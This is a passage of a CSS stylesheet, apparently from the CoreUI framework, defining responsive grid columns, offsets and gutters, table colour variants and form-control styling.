                    margin-right: 25%;
                }
                html:not([dir="rtl"]) .offset-md-4 {
                    margin-left: 33.33333333%;
                }
                *[dir="rtl"] .offset-md-4 {
                    margin-right: 33.33333333%;
                }
                html:not([dir="rtl"]) .offset-md-5 {
                    margin-left: 41.66666667%;
                }
                *[dir="rtl"] .offset-md-5 {
                    margin-right: 41.66666667%;
                }
                html:not([dir="rtl"]) .offset-md-6 {
                    margin-left: 50%;
                }
                *[dir="rtl"] .offset-md-6 {
                    margin-right: 50%;
                }
                html:not([dir="rtl"]) .offset-md-7 {
                    margin-left: 58.33333333%;
                }
                *[dir="rtl"] .offset-md-7 {
                    margin-right: 58.33333333%;
                }
                html:not([dir="rtl"]) .offset-md-8 {
                    margin-left: 66.66666667%;
                }
                *[dir="rtl"] .offset-md-8 {
                    margin-right: 66.66666667%;
                }
                html:not([dir="rtl"]) .offset-md-9 {
                    margin-left: 75%;
                }
                *[dir="rtl"] .offset-md-9 {
                    margin-right: 75%;
                }
                html:not([dir="rtl"]) .offset-md-10 {
                    margin-left: 83.33333333%;
                }
                *[dir="rtl"] .offset-md-10 {
                    margin-right: 83.33333333%;
                }
                html:not([dir="rtl"]) .offset-md-11 {
                    margin-left: 91.66666667%;
                }
                *[dir="rtl"] .offset-md-11 {
                    margin-right: 91.66666667%;
                }
                .g-md-0,
                .gx-md-0 {
                    --cui-gutter-x: 0;
                }
                .g-md-0,
                .gy-md-0 {
                    --cui-gutter-y: 0;
                }
                .g-md-1,
                .gx-md-1 {
                    --cui-gutter-x: 0.25rem;
                }
                .g-md-1,
                .gy-md-1 {
                    --cui-gutter-y: 0.25rem;
                }
                .g-md-2,
                .gx-md-2 {
                    --cui-gutter-x: 0.5rem;
                }
                .g-md-2,
                .gy-md-2 {
                    --cui-gutter-y: 0.5rem;
                }
                .g-md-3,
                .gx-md-3 {
                    --cui-gutter-x: 1rem;
                }
                .g-md-3,
                .gy-md-3 {
                    --cui-gutter-y: 1rem;
                }
                .g-md-4,
                .gx-md-4 {
                    --cui-gutter-x: 1.5rem;
                }
                .g-md-4,
                .gy-md-4 {
                    --cui-gutter-y: 1.5rem;
                }
                .g-md-5,
                .gx-md-5 {
                    --cui-gutter-x: 3rem;
                }
                .g-md-5,
                .gy-md-5 {
                    --cui-gutter-y: 3rem;
                }
            }
            @media (min-width: 992px) {
                .col-lg {
                    flex: 1 0 0%;
                }
                .row-cols-lg-auto > * {
                    flex: 0 0 auto;
                    width: auto;
                }
                .row-cols-lg-1 > * {
                    flex: 0 0 auto;
                    width: 100%;
                }
                .row-cols-lg-2 > * {
                    flex: 0 0 auto;
                    width: 50%;
                }
                .row-cols-lg-3 > * {
                    flex: 0 0 auto;
                    width: 33.3333333333%;
                }
                .row-cols-lg-4 > * {
                    flex: 0 0 auto;
                    width: 25%;
                }
                .row-cols-lg-5 > * {
                    flex: 0 0 auto;
                    width: 20%;
                }
                .row-cols-lg-6 > * {
                    flex: 0 0 auto;
                    width: 16.6666666667%;
                }
                .col-lg-auto {
                    flex: 0 0 auto;
                    width: auto;
                }
                .col-lg-1 {
                    flex: 0 0 auto;
                    width: 8.33333333%;
                }
                .col-lg-2 {
                    flex: 0 0 auto;
                    width: 16.66666667%;
                }
                .col-lg-3 {
                    flex: 0 0 auto;
                    width: 25%;
                }
                .col-lg-4 {
                    flex: 0 0 auto;
                    width: 33.33333333%;
                }
                .col-lg-5 {
                    flex: 0 0 auto;
                    width: 41.66666667%;
                }
                .col-lg-6 {
                    flex: 0 0 auto;
                    width: 50%;
                }
                .col-lg-7 {
                    flex: 0 0 auto;
                    width: 58.33333333%;
                }
                .col-lg-8 {
                    flex: 0 0 auto;
                    width: 66.66666667%;
                }
                .col-lg-9 {
                    flex: 0 0 auto;
                    width: 75%;
                }
                .col-lg-10 {
                    flex: 0 0 auto;
                    width: 83.33333333%;
                }
                .col-lg-11 {
                    flex: 0 0 auto;
                    width: 91.66666667%;
                }
                .col-lg-12 {
                    flex: 0 0 auto;
                    width: 100%;
                }
                html:not([dir="rtl"]) .offset-lg-0 {
                    margin-left: 0;
                }
                *[dir="rtl"] .offset-lg-0 {
                    margin-right: 0;
                }
                html:not([dir="rtl"]) .offset-lg-1 {
                    margin-left: 8.33333333%;
                }
                *[dir="rtl"] .offset-lg-1 {
                    margin-right: 8.33333333%;
                }
                html:not([dir="rtl"]) .offset-lg-2 {
                    margin-left: 16.66666667%;
                }
                *[dir="rtl"] .offset-lg-2 {
                    margin-right: 16.66666667%;
                }
                html:not([dir="rtl"]) .offset-lg-3 {
                    margin-left: 25%;
                }
                *[dir="rtl"] .offset-lg-3 {
                    margin-right: 25%;
                }
                html:not([dir="rtl"]) .offset-lg-4 {
                    margin-left: 33.33333333%;
                }
                *[dir="rtl"] .offset-lg-4 {
                    margin-right: 33.33333333%;
                }
                html:not([dir="rtl"]) .offset-lg-5 {
                    margin-left: 41.66666667%;
                }
                *[dir="rtl"] .offset-lg-5 {
                    margin-right: 41.66666667%;
                }
                html:not([dir="rtl"]) .offset-lg-6 {
                    margin-left: 50%;
                }
                *[dir="rtl"] .offset-lg-6 {
                    margin-right: 50%;
                }
                html:not([dir="rtl"]) .offset-lg-7 {
                    margin-left: 58.33333333%;
                }
                *[dir="rtl"] .offset-lg-7 {
                    margin-right: 58.33333333%;
                }
                html:not([dir="rtl"]) .offset-lg-8 {
                    margin-left: 66.66666667%;
                }
                *[dir="rtl"] .offset-lg-8 {
                    margin-right: 66.66666667%;
                }
                html:not([dir="rtl"]) .offset-lg-9 {
                    margin-left: 75%;
                }
                *[dir="rtl"] .offset-lg-9 {
                    margin-right: 75%;
                }
                html:not([dir="rtl"]) .offset-lg-10 {
                    margin-left: 83.33333333%;
                }
                *[dir="rtl"] .offset-lg-10 {
                    margin-right: 83.33333333%;
                }
                html:not([dir="rtl"]) .offset-lg-11 {
                    margin-left: 91.66666667%;
                }
                *[dir="rtl"] .offset-lg-11 {
                    margin-right: 91.66666667%;
                }
                .g-lg-0,
                .gx-lg-0 {
                    --cui-gutter-x: 0;
                }
                .g-lg-0,
                .gy-lg-0 {
                    --cui-gutter-y: 0;
                }
                .g-lg-1,
                .gx-lg-1 {
                    --cui-gutter-x: 0.25rem;
                }
                .g-lg-1,
                .gy-lg-1 {
                    --cui-gutter-y: 0.25rem;
                }
                .g-lg-2,
                .gx-lg-2 {
                    --cui-gutter-x: 0.5rem;
                }
                .g-lg-2,
                .gy-lg-2 {
                    --cui-gutter-y: 0.5rem;
                }
                .g-lg-3,
                .gx-lg-3 {
                    --cui-gutter-x: 1rem;
                }
                .g-lg-3,
                .gy-lg-3 {
                    --cui-gutter-y: 1rem;
                }
                .g-lg-4,
                .gx-lg-4 {
                    --cui-gutter-x: 1.5rem;
                }
                .g-lg-4,
                .gy-lg-4 {
                    --cui-gutter-y: 1.5rem;
                }
                .g-lg-5,
                .gx-lg-5 {
                    --cui-gutter-x: 3rem;
                }
                .g-lg-5,
                .gy-lg-5 {
                    --cui-gutter-y: 3rem;
                }
            }
            @media (min-width: 1200px) {
                .col-xl {
                    flex: 1 0 0%;
                }
                .row-cols-xl-auto > * {
                    flex: 0 0 auto;
                    width: auto;
                }
                .row-cols-xl-1 > * {
                    flex: 0 0 auto;
                    width: 100%;
                }
                .row-cols-xl-2 > * {
                    flex: 0 0 auto;
                    width: 50%;
                }
                .row-cols-xl-3 > * {
                    flex: 0 0 auto;
                    width: 33.3333333333%;
                }
                .row-cols-xl-4 > * {
                    flex: 0 0 auto;
                    width: 25%;
                }
                .row-cols-xl-5 > * {
                    flex: 0 0 auto;
                    width: 20%;
                }
                .row-cols-xl-6 > * {
                    flex: 0 0 auto;
                    width: 16.6666666667%;
                }
                .col-xl-auto {
                    flex: 0 0 auto;
                    width: auto;
                }
                .col-xl-1 {
                    flex: 0 0 auto;
                    width: 8.33333333%;
                }
                .col-xl-2 {
                    flex: 0 0 auto;
                    width: 16.66666667%;
                }
                .col-xl-3 {
                    flex: 0 0 auto;
                    width: 25%;
                }
                .col-xl-4 {
                    flex: 0 0 auto;
                    width: 33.33333333%;
                }
                .col-xl-5 {
                    flex: 0 0 auto;
                    width: 41.66666667%;
                }
                .col-xl-6 {
                    flex: 0 0 auto;
                    width: 50%;
                }
                .col-xl-7 {
                    flex: 0 0 auto;
                    width: 58.33333333%;
                }
                .col-xl-8 {
                    flex: 0 0 auto;
                    width: 66.66666667%;
                }
                .col-xl-9 {
                    flex: 0 0 auto;
                    width: 75%;
                }
                .col-xl-10 {
                    flex: 0 0 auto;
                    width: 83.33333333%;
                }
                .col-xl-11 {
                    flex: 0 0 auto;
                    width: 91.66666667%;
                }
                .col-xl-12 {
                    flex: 0 0 auto;
                    width: 100%;
                }
                html:not([dir="rtl"]) .offset-xl-0 {
                    margin-left: 0;
                }
                *[dir="rtl"] .offset-xl-0 {
                    margin-right: 0;
                }
                html:not([dir="rtl"]) .offset-xl-1 {
                    margin-left: 8.33333333%;
                }
                *[dir="rtl"] .offset-xl-1 {
                    margin-right: 8.33333333%;
                }
                html:not([dir="rtl"]) .offset-xl-2 {
                    margin-left: 16.66666667%;
                }
                *[dir="rtl"] .offset-xl-2 {
                    margin-right: 16.66666667%;
                }
                html:not([dir="rtl"]) .offset-xl-3 {
                    margin-left: 25%;
                }
                *[dir="rtl"] .offset-xl-3 {
                    margin-right: 25%;
                }
                html:not([dir="rtl"]) .offset-xl-4 {
                    margin-left: 33.33333333%;
                }
                *[dir="rtl"] .offset-xl-4 {
                    margin-right: 33.33333333%;
                }
                html:not([dir="rtl"]) .offset-xl-5 {
                    margin-left: 41.66666667%;
                }
                *[dir="rtl"] .offset-xl-5 {
                    margin-right: 41.66666667%;
                }
                html:not([dir="rtl"]) .offset-xl-6 {
                    margin-left: 50%;
                }
                *[dir="rtl"] .offset-xl-6 {
                    margin-right: 50%;
                }
                html:not([dir="rtl"]) .offset-xl-7 {
                    margin-left: 58.33333333%;
                }
                *[dir="rtl"] .offset-xl-7 {
                    margin-right: 58.33333333%;
                }
                html:not([dir="rtl"]) .offset-xl-8 {
                    margin-left: 66.66666667%;
                }
                *[dir="rtl"] .offset-xl-8 {
                    margin-right: 66.66666667%;
                }
                html:not([dir="rtl"]) .offset-xl-9 {
                    margin-left: 75%;
                }
                *[dir="rtl"] .offset-xl-9 {
                    margin-right: 75%;
                }
                html:not([dir="rtl"]) .offset-xl-10 {
                    margin-left: 83.33333333%;
                }
                *[dir="rtl"] .offset-xl-10 {
                    margin-right: 83.33333333%;
                }
                html:not([dir="rtl"]) .offset-xl-11 {
                    margin-left: 91.66666667%;
                }
                *[dir="rtl"] .offset-xl-11 {
                    margin-right: 91.66666667%;
                }
                .g-xl-0,
                .gx-xl-0 {
                    --cui-gutter-x: 0;
                }
                .g-xl-0,
                .gy-xl-0 {
                    --cui-gutter-y: 0;
                }
                .g-xl-1,
                .gx-xl-1 {
                    --cui-gutter-x: 0.25rem;
                }
                .g-xl-1,
                .gy-xl-1 {
                    --cui-gutter-y: 0.25rem;
                }
                .g-xl-2,
                .gx-xl-2 {
                    --cui-gutter-x: 0.5rem;
                }
                .g-xl-2,
                .gy-xl-2 {
                    --cui-gutter-y: 0.5rem;
                }
                .g-xl-3,
                .gx-xl-3 {
                    --cui-gutter-x: 1rem;
                }
                .g-xl-3,
                .gy-xl-3 {
                    --cui-gutter-y: 1rem;
                }
                .g-xl-4,
                .gx-xl-4 {
                    --cui-gutter-x: 1.5rem;
                }
                .g-xl-4,
                .gy-xl-4 {
                    --cui-gutter-y: 1.5rem;
                }
                .g-xl-5,
                .gx-xl-5 {
                    --cui-gutter-x: 3rem;
                }
                .g-xl-5,
                .gy-xl-5 {
                    --cui-gutter-y: 3rem;
                }
            }
            @media (min-width: 1400px) {
                .col-xxl {
                    flex: 1 0 0%;
                }
                .row-cols-xxl-auto > * {
                    flex: 0 0 auto;
                    width: auto;
                }
                .row-cols-xxl-1 > * {
                    flex: 0 0 auto;
                    width: 100%;
                }
                .row-cols-xxl-2 > * {
                    flex: 0 0 auto;
                    width: 50%;
                }
                .row-cols-xxl-3 > * {
                    flex: 0 0 auto;
                    width: 33.3333333333%;
                }
                .row-cols-xxl-4 > * {
                    flex: 0 0 auto;
                    width: 25%;
                }
                .row-cols-xxl-5 > * {
                    flex: 0 0 auto;
                    width: 20%;
                }
                .row-cols-xxl-6 > * {
                    flex: 0 0 auto;
                    width: 16.6666666667%;
                }
                .col-xxl-auto {
                    flex: 0 0 auto;
                    width: auto;
                }
                .col-xxl-1 {
                    flex: 0 0 auto;
                    width: 8.33333333%;
                }
                .col-xxl-2 {
                    flex: 0 0 auto;
                    width: 16.66666667%;
                }
                .col-xxl-3 {
                    flex: 0 0 auto;
                    width: 25%;
                }
                .col-xxl-4 {
                    flex: 0 0 auto;
                    width: 33.33333333%;
                }
                .col-xxl-5 {
                    flex: 0 0 auto;
                    width: 41.66666667%;
                }
                .col-xxl-6 {
                    flex: 0 0 auto;
                    width: 50%;
                }
                .col-xxl-7 {
                    flex: 0 0 auto;
                    width: 58.33333333%;
                }
                .col-xxl-8 {
                    flex: 0 0 auto;
                    width: 66.66666667%;
                }
                .col-xxl-9 {
                    flex: 0 0 auto;
                    width: 75%;
                }
                .col-xxl-10 {
                    flex: 0 0 auto;
                    width: 83.33333333%;
                }
                .col-xxl-11 {
                    flex: 0 0 auto;
                    width: 91.66666667%;
                }
                .col-xxl-12 {
                    flex: 0 0 auto;
                    width: 100%;
                }
                html:not([dir="rtl"]) .offset-xxl-0 {
                    margin-left: 0;
                }
                *[dir="rtl"] .offset-xxl-0 {
                    margin-right: 0;
                }
                html:not([dir="rtl"]) .offset-xxl-1 {
                    margin-left: 8.33333333%;
                }
                *[dir="rtl"] .offset-xxl-1 {
                    margin-right: 8.33333333%;
                }
                html:not([dir="rtl"]) .offset-xxl-2 {
                    margin-left: 16.66666667%;
                }
                *[dir="rtl"] .offset-xxl-2 {
                    margin-right: 16.66666667%;
                }
                html:not([dir="rtl"]) .offset-xxl-3 {
                    margin-left: 25%;
                }
                *[dir="rtl"] .offset-xxl-3 {
                    margin-right: 25%;
                }
                html:not([dir="rtl"]) .offset-xxl-4 {
                    margin-left: 33.33333333%;
                }
                *[dir="rtl"] .offset-xxl-4 {
                    margin-right: 33.33333333%;
                }
                html:not([dir="rtl"]) .offset-xxl-5 {
                    margin-left: 41.66666667%;
                }
                *[dir="rtl"] .offset-xxl-5 {
                    margin-right: 41.66666667%;
                }
                html:not([dir="rtl"]) .offset-xxl-6 {
                    margin-left: 50%;
                }
                *[dir="rtl"] .offset-xxl-6 {
                    margin-right: 50%;
                }
                html:not([dir="rtl"]) .offset-xxl-7 {
                    margin-left: 58.33333333%;
                }
                *[dir="rtl"] .offset-xxl-7 {
                    margin-right: 58.33333333%;
                }
                html:not([dir="rtl"]) .offset-xxl-8 {
                    margin-left: 66.66666667%;
                }
                *[dir="rtl"] .offset-xxl-8 {
                    margin-right: 66.66666667%;
                }
                html:not([dir="rtl"]) .offset-xxl-9 {
                    margin-left: 75%;
                }
                *[dir="rtl"] .offset-xxl-9 {
                    margin-right: 75%;
                }
                html:not([dir="rtl"]) .offset-xxl-10 {
                    margin-left: 83.33333333%;
                }
                *[dir="rtl"] .offset-xxl-10 {
                    margin-right: 83.33333333%;
                }
                html:not([dir="rtl"]) .offset-xxl-11 {
                    margin-left: 91.66666667%;
                }
                *[dir="rtl"] .offset-xxl-11 {
                    margin-right: 91.66666667%;
                }
                .g-xxl-0,
                .gx-xxl-0 {
                    --cui-gutter-x: 0;
                }
                .g-xxl-0,
                .gy-xxl-0 {
                    --cui-gutter-y: 0;
                }
                .g-xxl-1,
                .gx-xxl-1 {
                    --cui-gutter-x: 0.25rem;
                }
                .g-xxl-1,
                .gy-xxl-1 {
                    --cui-gutter-y: 0.25rem;
                }
                .g-xxl-2,
                .gx-xxl-2 {
                    --cui-gutter-x: 0.5rem;
                }
                .g-xxl-2,
                .gy-xxl-2 {
                    --cui-gutter-y: 0.5rem;
                }
                .g-xxl-3,
                .gx-xxl-3 {
                    --cui-gutter-x: 1rem;
                }
                .g-xxl-3,
                .gy-xxl-3 {
                    --cui-gutter-y: 1rem;
                }
                .g-xxl-4,
                .gx-xxl-4 {
                    --cui-gutter-x: 1.5rem;
                }
                .g-xxl-4,
                .gy-xxl-4 {
                    --cui-gutter-y: 1.5rem;
                }
                .g-xxl-5,
                .gx-xxl-5 {
                    --cui-gutter-x: 3rem;
                }
                .g-xxl-5,
                .gy-xxl-5 {
                    --cui-gutter-y: 3rem;
                }
            }
            .table {
                --cui-table-color: var(--cui-body-color);
                --cui-table-bg: transparent;
                --cui-table-border-color: var(--cui-border-color);
                --cui-table-accent-bg: transparent;
                --cui-table-striped-color: var(--cui-body-color);
                --cui-table-striped-bg: rgba(0, 0, 21, 0.05);
                --cui-table-active-color: var(--cui-body-color);
                --cui-table-active-bg: rgba(0, 0, 21, 0.1);
                --cui-table-hover-color: var(--cui-body-color);
                --cui-table-hover-bg: rgba(0, 0, 21, 0.075);
                width: 100%;
                margin-bottom: 1rem;
                color: var(--cui-table-color);
                vertical-align: top;
                border-color: var(--cui-table-border-color);
            }
            .table > :not(caption) > * > * {
                padding: 0.5rem;
                background-color: var(--cui-table-bg);
                border-bottom-width: 1px;
                box-shadow: inset 0 0 0 9999px var(--cui-table-accent-bg);
            }
            .table > tbody {
                vertical-align: inherit;
            }
            .table > thead {
                vertical-align: bottom;
            }
            .table-group-divider {
                border-top: 2px solid currentcolor;
            }
            .caption-top {
                caption-side: top;
            }
            .table-sm > :not(caption) > * > * {
                padding: 0.25rem;
            }
            .table-bordered > :not(caption) > * {
                border-width: 1px 0;
            }
            .table-bordered > :not(caption) > * > * {
                border-width: 0 1px;
            }
            .table-borderless > :not(caption) > * > * {
                border-bottom-width: 0;
            }
            .table-borderless > :not(:first-child) {
                border-top-width: 0;
            }
            .table-striped > tbody > tr:nth-of-type(odd) > * {
                --cui-table-accent-bg: var(--cui-table-striped-bg);
                color: var(--cui-table-striped-color);
            }
            .table-striped-columns > :not(caption) > tr > :nth-child(even) {
                --cui-table-accent-bg: var(--cui-table-striped-bg);
                color: var(--cui-table-striped-color);
            }
            .table-active {
                --cui-table-accent-bg: var(--cui-table-active-bg);
                color: var(--cui-table-active-color);
            }
            .table-hover > tbody > tr:hover > * {
                --cui-table-accent-bg: var(--cui-table-hover-bg);
                color: var(--cui-table-hover-color);
            }
            .table-primary {
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-bg: #d6d2f8;
                --cui-table-border-color: rgba(198, 196, 232, 0.995);
                --cui-table-striped-bg: rgba(206, 203, 240, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(198, 196, 232, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(202, 199, 236, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
                color: var(--cui-table-color);
                border-color: var(--cui-table-border-color);
            }
            .table-secondary {
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-bg: #ebedef;
                --cui-table-border-color: rgba(218, 220, 224, 0.995);
                --cui-table-striped-bg: rgba(226, 229, 232, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(218, 220, 224, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(222, 225, 228, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
                color: var(--cui-table-color);
                border-color: var(--cui-table-border-color);
            }
            .table-success {
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-bg: #d5f1de;
                --cui-table-border-color: rgba(198, 224, 208, 0.995);
                --cui-table-striped-bg: rgba(205, 233, 215, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(198, 224, 208, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(201, 228, 212, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
                color: var(--cui-table-color);
                border-color: var(--cui-table-border-color);
            }
            .table-info {
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-bg: #d6ebff;
                --cui-table-border-color: rgba(198, 219, 238, 0.995);
                --cui-table-striped-bg: rgba(206, 227, 247, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(198, 219, 238, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(202, 223, 243, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
                color: var(--cui-table-color);
                border-color: var(--cui-table-border-color);
            }
            .table-warning {
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-bg: #feefd0;
                --cui-table-border-color: rgba(235, 222, 196, 0.995);
                --cui-table-striped-bg: rgba(244, 231, 202, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(235, 222, 196, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(240, 226, 199, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
                color: var(--cui-table-color);
                border-color: var(--cui-table-border-color);
            }
            .table-danger {
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-bg: #fadddd;
                --cui-table-border-color: rgba(231, 206, 208, 0.995);
                --cui-table-striped-bg: rgba(241, 214, 214, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(231, 206, 208, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(236, 210, 211, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
                color: var(--cui-table-color);
                border-color: var(--cui-table-border-color);
            }
            .table-light {
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-bg: #ebedef;
                --cui-table-border-color: rgba(218, 220, 224, 0.995);
                --cui-table-striped-bg: rgba(226, 229, 232, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(218, 220, 224, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(222, 225, 228, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
                color: var(--cui-table-color);
                border-color: var(--cui-table-border-color);
            }
            .table-dark {
                --cui-table-color: rgba(255, 255, 255, 0.87);
                --cui-table-bg: #4f5d73;
                --cui-table-border-color: rgba(93, 106, 126, 0.987);
                --cui-table-striped-bg: rgba(86, 99, 120, 0.9935);
                --cui-table-striped-color: rgba(255, 255, 255, 0.87);
                --cui-table-active-bg: rgba(93, 106, 126, 0.987);
                --cui-table-active-color: rgba(255, 255, 255, 0.87);
                --cui-table-hover-bg: rgba(89, 103, 123, 0.99025);
                --cui-table-hover-color: rgba(255, 255, 255, 0.87);
                color: var(--cui-table-color);
                border-color: var(--cui-table-border-color);
            }
            .table-responsive {
                overflow-x: auto;
                -webkit-overflow-scrolling: touch;
            }
            @media (max-width: 575.98px) {
                .table-responsive-sm {
                    overflow-x: auto;
                    -webkit-overflow-scrolling: touch;
                }
            }
            @media (max-width: 767.98px) {
                .table-responsive-md {
                    overflow-x: auto;
                    -webkit-overflow-scrolling: touch;
                }
            }
            @media (max-width: 991.98px) {
                .table-responsive-lg {
                    overflow-x: auto;
                    -webkit-overflow-scrolling: touch;
                }
            }
            @media (max-width: 1199.98px) {
                .table-responsive-xl {
                    overflow-x: auto;
                    -webkit-overflow-scrolling: touch;
                }
            }
            @media (max-width: 1399.98px) {
                .table-responsive-xxl {
                    overflow-x: auto;
                    -webkit-overflow-scrolling: touch;
                }
            }
            .form-label {
                margin-bottom: 0.5rem;
                color: var(--cui-form-label-color);
            }
            .col-form-label {
                padding-top: calc(0.375rem + 1px);
                padding-bottom: calc(0.375rem + 1px);
                margin-bottom: 0;
                font-size: inherit;
                line-height: 1.5;
                color: var(--cui-form-label-color);
            }
            .col-form-label-lg {
                padding-top: calc(0.5rem + 1px);
                padding-bottom: calc(0.5rem + 1px);
                font-size: 1.25rem;
            }
            .col-form-label-sm {
                padding-top: calc(0.25rem + 1px);
                padding-bottom: calc(0.25rem + 1px);
                font-size: 0.875rem;
            }
            .form-text {
                margin-top: 0.25rem;
                font-size: 0.875em;
                color: var(--cui-form-text-color, rgba(44, 56, 74, 0.38));
            }
            .form-control {
                display: block;
                width: 100%;
                padding: 0.375rem 0.75rem;
                font-size: 1rem;
                font-weight: 400;
                line-height: 1.5;
                color: var(--cui-input-color, rgba(44, 56, 74, 0.95));
                background-color: var(--cui-input-bg, #fff);
                background-clip: padding-box;
                border: 1px solid var(--cui-input-border-color, #b1b7c1);
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
                border-radius: 0.375rem;
                transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
            }
            @media (prefers-reduced-motion: reduce) {
                .form-control {
                    transition: none;
                }
            }
            .form-control[type="file"] {
                overflow: hidden;
            }
            .form-control[type="file"]:not(:disabled):not([readonly]) {
                cursor: pointer;
            }
            .form-control:focus {
                color: var(--cui-input-focus-color, rgba(44, 56, 74, 0.95));
                background-color: var(--cui-input-focus-bg, #fff);
                border-color: var(--cui-input-focus-border-color, #998fed);
                outline: 0;
                box-shadow: 0 0 0 0.25rem rgba(50, 31, 219, 0.25);
            }
            .form-control::-webkit-date-and-time-value {
                height: 1.5em;
            }
            .form-control::-moz-placeholder {
                color: var(--cui-input-placeholder-color, #8a93a2);
                opacity: 1;
            }
            .form-control::placeholder {
                color: var(--cui-input-placeholder-color, #8a93a2);
                opacity: 1;
            }
            .form-control:disabled {
                background-color: #d8dbe0;
                border-color: #b1b7c1;
                opacity: 1;
            }
            .form-control::-webkit-file-upload-button {
                padding: 0.375rem 0.75rem;
                margin: -0.375rem -0.75rem;
                -webkit-margin-end: 0.75rem;
                margin-inline-end: 0.75rem;
                color: var(--cui-form-file-button-color, rgba(44, 56, 74, 0.95));
                background-color: var(--cui-form-file-button-bg, #d8dbe0);
                pointer-events: none;
                border-color: inherit;
                border-style: solid;
                border-width: 0;
                border-inline-end-width: 1px;
                border-radius: 0;
                -webkit-transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
                transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
            }
            .form-control::file-selector-button {
                padding: 0.375rem 0.75rem;
                margin: -0.375rem -0.75rem;
                -webkit-margin-end: 0.75rem;
                margin-inline-end: 0.75rem;
                color: var(--cui-form-file-button-color, rgba(44, 56, 74, 0.95));
                background-color: var(--cui-form-file-button-bg, #d8dbe0);
                pointer-events: none;
                border-color: inherit;
                border-style: solid;
                border-width: 0;
                border-inline-end-width: 1px;
                border-radius: 0;
                transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
            }
            @media (prefers-reduced-motion: reduce) {
                .form-control::-webkit-file-upload-button {
                    -webkit-transition: none;
                    transition: none;
                }
                .form-control::file-selector-button {
                    transition: none;
                }
            }
            .form-control:hover:not(:disabled):not([readonly])::-webkit-file-upload-button {
                background-color: var(--cui-form-file-button-hover-bg, #cdd0d5);
            }
            .form-control:hover:not(:disabled):not([readonly])::file-selector-button {
                background-color: var(--cui-form-file-button-hover-bg, #cdd0d5);
            }
            .form-control-plaintext {
                display: block;
                width: 100%;
                padding: 0.375rem 0;
                margin-bottom: 0;
                line-height: 1.5;
                color: var(--cui-input-plaintext-color, rgba(44, 56, 74, 0.95));
                background-color: transparent;
                border: solid transparent;
                border-width: 1px 0;
            }
            .form-control-plaintext:focus {
                outline: 0;
            }
            .form-control-plaintext.form-control-sm,
            .form-control-plaintext.form-control-lg {
                padding-right: 0;
                padding-left: 0;
            }
            .form-control-sm {
                min-height: calc(1.5em + 0.5rem + 2px);
                padding: 0.25rem 0.5rem;
                font-size: 0.875rem;
                border-radius: 0.25rem;
            }
            .form-control-sm::-webkit-file-upload-button {
                padding: 0.25rem 0.5rem;
                margin: -0.25rem -0.5rem;
                -webkit-margin-end: 0.5rem;
                margin-inline-end: 0.5rem;
            }
            .form-control-sm::file-selector-button {
                padding: 0.25rem 0.5rem;
                margin: -0.25rem -0.5rem;
                -webkit-margin-end: 0.5rem;
                margin-inline-end: 0.5rem;
            }
            .form-control-lg {
                min-height: calc(1.5em + 1rem + 2px);
                padding: 0.5rem 1rem;
                font-size: 1.25rem;
                border-radius: 0.5rem;
            }
            .form-control-lg::-webkit-file-upload-button {
                padding: 0.5rem 1rem;
                margin: -0.5rem -1rem;
                -webkit-margin-end: 1rem;
                margin-inline-end: 1rem;
            }
            .form-control-lg::file-selector-button {
                padding: 0.5rem 1rem;
                margin: -0.5rem -1rem;
                -webkit-margin-end: 1rem;
                margin-inline-end: 1rem;
            }
            textarea.form-control {
                min-height: calc(1.5em + 0.75rem + 2px);
            }
            textarea.form-control-sm {
                min-height: calc(1.5em + 0.5rem + 2px);
            }
            textarea.form-control-lg {
                min-height: calc(1.5em + 1rem + 2px);
            }
            .form-control-color {
                width: 3rem;
                height: calc(1.5em + 0.75rem + 2px);
                padding: 0.375rem;
            }
            .form-control-color:not(:disabled):not([readonly]) {
                cursor: pointer;
            }
            .form-control-color::-moz-color-swatch {
                border: 0 !important;
                border-radius: 0.375rem;
            }
            .form-control-color::-webkit-color-swatch {
                border-radius: 0.375rem;
